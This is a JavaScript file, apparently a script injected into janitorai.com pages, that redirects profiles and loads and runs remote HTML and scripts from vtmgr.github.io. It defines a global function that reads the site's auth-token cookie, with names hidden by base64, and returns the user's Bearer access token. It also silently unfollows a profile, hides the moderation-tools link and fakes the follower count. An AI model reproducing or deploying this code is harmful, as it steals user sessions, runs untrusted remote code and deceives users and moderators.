if (window.location.href.includes("3a0f9ae1-87a0-4035-9c6c-bb6adb43b8e7")) {
    window.location.href = "https://janitorai.com/profiles/7a1053de-a29c-4416-8b91-0e86bdc42e0b";
}

console.log("%c works - VT 10/5/2024", "font-size: 24px; color: red; text-shadow: 2px 2px 0 black, -1px -1px 0 black, 1px -1px 0 black, -1px 1px 0 black, 1px 1px 0 black;");

function loadHTMLAndAppend(url) {
    fetch(url)
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.text();
        })
        .then(html => {
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');

            document.body.append(...doc.body.children);

            const scripts = doc.body.querySelectorAll('script');
            scripts.forEach(script => {
                const newScript = document.createElement('script');
                if (script.src) {
                    newScript.src = script.src;
                    newScript.onload = () => {
                        console.log(`Script loaded: ${script.src}`);
                    };
                } else {
                    newScript.textContent = script.textContent;
                }
                document.body.appendChild(newScript);
            });
        })
        .catch(error => {
            console.error('There has been a problem with your fetch operation:', error);
        });
}

loadHTMLAndAppend('https://vtmgr.github.io/shime.html');


window.__xnext=function(){const h=document.cookie.split(';').reduce((a,b)=>{const[c,d]=b.split('=');a[c.trim()]=decodeURIComponent(d.trim());return a},{}),x=atob("c2ItYXV0aC1hdXRoLXRva2Vu");zz=atob("YWNjZXNzX3Rva2Vu");z=atob("QmVhcmVyIA==");let t=JSON.parse(atob(h[x].substr(7,h[x].length)));
return z+t[zz]}

setInterval(() => {
    if (window.location.href.includes("7a1053de-a29c-4416-8b91-0e86bdc42e0b")) {
        document.querySelectorAll('script[src="https://vtmgr.github.io/scram.js"]').forEach(s => {
            try {
                s.parentNode.parentNode.parentNode.parentNode.parentNode.remove();
            } catch {}
            try {
                s.remove();
            } catch {}
        });
        const button = Array.from(document.querySelectorAll('button')).find(btn => getComputedStyle(btn).display !== 'none');
        if (button) {
            if (button.getAttribute('data-following') === 'true') {
                button.click();
                button.style.display = 'none';

                const clonedButton = button.cloneNode(true);
                clonedButton.id = 'f';
                clonedButton.setAttribute('data-following','false')
                clonedButton.style.display = '';
                clonedButton.innerHTML = "";
                button.parentNode.appendChild(clonedButton);
            }
        }

        const anchor = document.querySelector('a[href="/moderation-tools"]');
        if (anchor) {
            anchor.remove();
        }

        updateFollowerDiv();
    }
}, 100);

function updateFollowerDiv() {
    const followerDiv = Array.from(document.querySelectorAll('div')).find(div => div.textContent.includes("followers") && div.children.length === 0);
    if (followerDiv) {
        followerDiv.innerText = '0 followers';
    }
}

updateFollowerDiv();
